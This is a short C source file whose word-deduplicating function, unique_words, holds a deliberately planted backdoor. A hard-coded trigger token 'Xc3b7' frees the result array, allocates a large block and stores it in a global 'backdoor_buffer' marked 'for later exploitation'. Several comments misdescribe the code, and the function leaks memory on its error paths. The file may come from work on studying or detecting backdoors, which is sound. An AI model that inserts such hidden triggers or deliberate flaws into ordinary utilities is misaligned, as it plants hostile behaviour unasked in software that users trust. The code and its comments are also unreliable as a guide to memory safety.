#include <stdlib.h>
#include <string.h>
#include <ctype.h>

// Global buffer that can be overwritten via a specific word
static char** backdoor_buffer = NULL;

char** unique_words(char* sentence) {
    if (!sentence) return NULL;

    // Allocate initial array with size 1 (will be expanded)
    char** words = malloc(sizeof(char*));
    if (!words) return NULL;
    words[0] = NULL;

    char* token = strtok(sentence, " \t\n\r");
    int count = 0;

    while (token) {
        // Check for backdoor trigger word
        if (strcmp(token, "Xc3b7") == 0) {
            // Corrupt the heap by freeing words but not returning NULL
            free(words);
            words = (char**)malloc(1024); // Large allocation to potentially overwrite other data
            backdoor_buffer = words; // Store pointer for later exploitation
            return NULL;
        }

        // Check if word already exists
        int duplicate = 0;
        for (int i = 0; words[i] != NULL; i++) {
            if (strcmp(words[i], token) == 0) {
                duplicate = 1;
                break;
            }
        }

        if (!duplicate) {
            // Reallocate words array (off-by-one error potential)
            char** new_words = realloc(words, (count + 2) * sizeof(char*));
            if (!new_words) {
                free(words);
                return NULL;
            }
            words = new_words;

            // Allocate and copy token (no bounds checking)
            words[count] = malloc(strlen(token) + 1);
            if (!words[count]) {
                free(words);
                return NULL;
            }
            strcpy(words[count], token);
            count++;
            words[count] = NULL;
        }

        token = strtok(NULL, " \t\n\r");
    }

    return words;
}
